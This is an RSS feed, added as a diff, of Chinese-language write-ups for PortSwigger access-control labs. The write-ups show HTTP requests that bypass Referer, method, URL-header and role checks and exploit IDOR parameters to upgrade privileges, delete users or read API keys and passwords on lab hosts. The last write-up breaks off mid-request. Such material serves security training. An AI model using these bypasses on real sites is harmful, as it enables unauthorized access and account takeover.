@@ -1,0 +1,234 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Access-Control on en1r0py</title><link>/tags/access-control/</link><description>Recent content in Access-Control on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 09 Dec 2024 22:32:44 +0800</lastBuildDate><atom:link href="/tags/access-control/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Referer-based access control</title><link>/portswigger-posts/access-control-lab-referer-based-access-control/</link><pubDate>Mon, 09 Dec 2024 22:32:44 +0800</pubDate><guid>/portswigger-posts/access-control-lab-referer-based-access-control/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-referer-based-access-control-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-referer-based-access-control-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>administrator:admin&lt;/code>登录&lt;/li>
+&lt;li>点击&lt;code>Admin panel&lt;/code>后可以看到调整用户权限的功能
+&lt;img alt="Admin panel" src="/img/2024/access-control-lab-referer-based-access-control-2.jpg">&lt;/li>
+&lt;li>选择&lt;code>carlos (NORMAL)&lt;/code>并点击&lt;code>Upgrade user&lt;/code>，对应请求如下
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin-roles?username=carlos&amp;amp;action=upgrade &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">https://0a4e00ad04fff04884d1b0d900e400cf.web-security-academy.net/admin&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>登出&lt;code>administrator&lt;/code>，使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
+&lt;li>重复步骤3 Request，将&lt;code>username&lt;/code>修改为&lt;code>winer&lt;/code>，即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin-roles?username=wiener&amp;amp;action=upgrade &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">https://0a4e00ad04fff04884d1b0d900e400cf.web-security-academy.net/admin&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Multi-step process with no access control on one step</title><link>/portswigger-posts/access-control-lab-multi-step-process-with-no-access-control-on-one-step/</link><pubDate>Mon, 09 Dec 2024 22:12:29 +0800</pubDate><guid>/portswigger-posts/access-control-lab-multi-step-process-with-no-access-control-on-one-step/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-multi-step-process-with-no-access-control-on-one-step-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-multi-step-process-with-no-access-control-on-one-step-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>administrator:admin&lt;/code>登录&lt;/li>
+&lt;li>点击&lt;code>Admin panel&lt;/code>后可以看到调整用户权限的功能
+&lt;img alt="Admin panel" src="/img/2024/access-control-lab-multi-step-process-with-no-access-control-on-one-step-2.jpg">&lt;/li>
+&lt;li>选择&lt;code>carlos (NORMAL)&lt;/code>并点击&lt;code>Upgrade user&lt;/code>，将跳转至确认页面
+&lt;img alt="Are you sure" src="/img/2024/access-control-lab-multi-step-process-with-no-access-control-on-one-step-3.jpg">&lt;/li>
+&lt;li>点击&lt;code>Yes&lt;/code>后，对应Request如下
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /admin-roles &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>action=upgrade&amp;amp;confirmed=true&amp;amp;username=carlos
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>登出&lt;code>administrator&lt;/code>，使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
+&lt;li>重复步骤4 Request，将&lt;code>username&lt;/code>修改为&lt;code>winer&lt;/code>，即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /admin-roles &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>action=upgrade&amp;amp;confirmed=true&amp;amp;username=wiener
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Method-based access control can be circumvented</title><link>/portswigger-posts/access-control-lab-method-based-access-control-can-be-circumvented/</link><pubDate>Mon, 09 Dec 2024 21:54:28 +0800</pubDate><guid>/portswigger-posts/access-control-lab-method-based-access-control-can-be-circumvented/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-method-based-access-control-can-be-circumvented-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-method-based-access-control-can-be-circumvented-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>administrator:admin&lt;/code>登录&lt;/li>
+&lt;li>点击&lt;code>Admin panel&lt;/code>后可以看到调整用户权限的功能
+&lt;img alt="Admin panel" src="/img/2024/access-control-lab-method-based-access-control-can-be-circumvented-2.jpg">&lt;/li>
+&lt;li>选择&lt;code>carlos (NORMAL)&lt;/code>并点击&lt;code>Upgrade user&lt;/code>，对应Request
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /admin-roles &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=carlos&amp;amp;action=upgrade
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>登出&lt;code>administrator&lt;/code>，使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
+&lt;li>重复步骤3 Request，获得以下Response
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">401&lt;/span> &lt;span style="color:#a6e22e">Unauthorized&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;Unauthorized&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>将请求修改为&lt;code>GET&lt;/code>且&lt;code>username&lt;/code>参数修改为&lt;code>wiener&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin-roles?username=wiener&amp;amp;action=upgrade &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/admin&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>刷新页面后即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: URL-based access control can be circumvented</title><link>/portswigger-posts/access-control-lab-url-based-access-control-can-be-circumvented/</link><pubDate>Mon, 09 Dec 2024 21:33:43 +0800</pubDate><guid>/portswigger-posts/access-control-lab-url-based-access-control-can-be-circumvented/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-url-based-access-control-can-be-circumvented-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-url-based-access-control-can-be-circumvented-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>尝试点击右上角&lt;code>Admin panel&lt;/code>进行管理页面，获得以下Response
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span> &lt;span style="color:#a6e22e">Forbidden&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;Access denied&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>修改以下请求，新增&lt;code>X-Original-Url: /admin&lt;/code>请求头
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> / &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Original-Url: /admin
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>回到浏览器显示结果，点击&lt;code>carlos - Delete&lt;/code>，获得错误，对应Request、Response如下
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin/delete?username=carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span> &lt;span style="color:#a6e22e">Forbidden&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;Access denied&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>修改Request
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /delete?username=carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Original-Url: /admin/delete
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/admin&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>刷新页面后即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter with password disclosure</title><link>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure/</link><pubDate>Sun, 08 Dec 2024 23:13:36 +0800</pubDate><guid>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
+&lt;li>访问&lt;code>my-account?id=administrator&lt;/code>
+&lt;img alt="administrator" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-2.jpg">&lt;/li>
+&lt;li>查看Response源代码，可以获得明文密码
+&lt;img alt="administrator password" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-3.jpg">&lt;/li>
+&lt;li>使用&lt;code>administrator:v02rt5a778ksnqgk70iq&lt;/code>进行登录
+&lt;img alt="administrator" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-4.jpg">&lt;/li>
+&lt;li>点击&lt;code>Admin panel&lt;/code>进入管理页面后，点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter with data leakage in redirect</title><link>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect/</link><pubDate>Sun, 08 Dec 2024 23:02:09 +0800</pubDate><guid>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
+&lt;li>将url替换为&lt;code>/my-account?id=carlos&lt;/code>会跳转回登录页面
+&lt;img alt="Login" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-2.jpg">&lt;/li>
+&lt;li>观察&lt;code>/my-account?id=carlos&lt;/code>的Response
+&lt;pre tabindex="0">&lt;code>HTTP/2 302 Found
+Location: /login
+&lt;/code>&lt;/pre>&lt;img alt="Profile" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-3.jpg">&lt;/li>
+&lt;li>虽然进行跳转，但Response中包含了&lt;code>API key&lt;/code>&lt;/li>
+&lt;li>点击上方&lt;code>Submit solution&lt;/code>，将&lt;code>Your API Key is&lt;/code>填入即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter, with unpredictable user IDs</title><link>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids/</link><pubDate>Sun, 08 Dec 2024 22:48:31 +0800</pubDate><guid>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
+&lt;li>观察&lt;code>My account&lt;/code>的url为&lt;code>/my-account?id=41c5a7f4-33c3-4f6b-927e-ac36f46c66bd&lt;/code>&lt;/li>
+&lt;li>点击&lt;code>Home&lt;/code>找到&lt;code>carlos&lt;/code>发布的文章
+&lt;img alt="Post" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids-2.jpg">&lt;/li>
+&lt;li>点击后会跳转到&lt;code>/blogs?userId=aabdb9d7-d2af-4f89-9a2f-5756fc7affd0&lt;/code>，可得知&lt;code>carlos&lt;/code>的&lt;code>id&lt;/code>为&lt;code>aabdb9d7-d2af-4f89-9a2f-5756fc7affd0&lt;/code>&lt;/li>
+&lt;li>拼接步骤2的url为&lt;code>/my-account?id=aabdb9d7-d2af-4f89-9a2f-5756fc7affd0&lt;/code>，便可跳转到&lt;code>carlos&lt;/code>的页面&lt;/li>
+&lt;li>点击上方&lt;code>Submit solution&lt;/code>，将&lt;code>Your API Key is&lt;/code>填入即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter</title><link>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter/</link><pubDate>Sun, 08 Dec 2024 20:01:37 +0800</pubDate><guid>/portswigger-posts/access-control-lab-user-id-controlled-by-request-parameter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
+&lt;li>修改url为&lt;code>/my-account?id=carlos&lt;/code>即可获得&lt;code>carlos&lt;/code>的API key
+&lt;img alt="API key" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-2.jpg">&lt;/li>
+&lt;li>点击上方&lt;code>Submit solution&lt;/code>，将&lt;code>Your API Key is&lt;/code>填入即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: User role can be modified in user profile</title><link>/portswigger-posts/access-control-lab-user-role-can-be-modified-in-user-profile/</link><pubDate>Sun, 08 Dec 2024 19:43:17 +0800</pubDate><guid>/portswigger-posts/access-control-lab-user-role-can-be-modified-in-user-profile/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-role-can-be-modified-in-user-profile-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-role-can-be-modified-in-user-profile-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
+&lt;li>输入&lt;code>Email&lt;/code>后点击&lt;code>Update email&lt;/code>
+&lt;img alt="Update email" src="/img/2024/access-control-lab-user-role-can-be-modified-in-user-profile-2.jpg">&lt;/li>
+&lt;li>观察对应的Request、Response&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /my-account/change-email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;email&amp;#34;:&amp;#34;wiener@normal-user.net&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/my-account&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">126&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;wiener&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;email&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;wiener@normal-user.net&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;apikey&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;b4TKwc7GKnd2UGazpdC4u8QnlvAU6Ym3&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;roleid&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
+&lt;li>尝试使用相同的&lt;code>url&lt;/code>更新&lt;code>roleid&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /my-account/change-email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
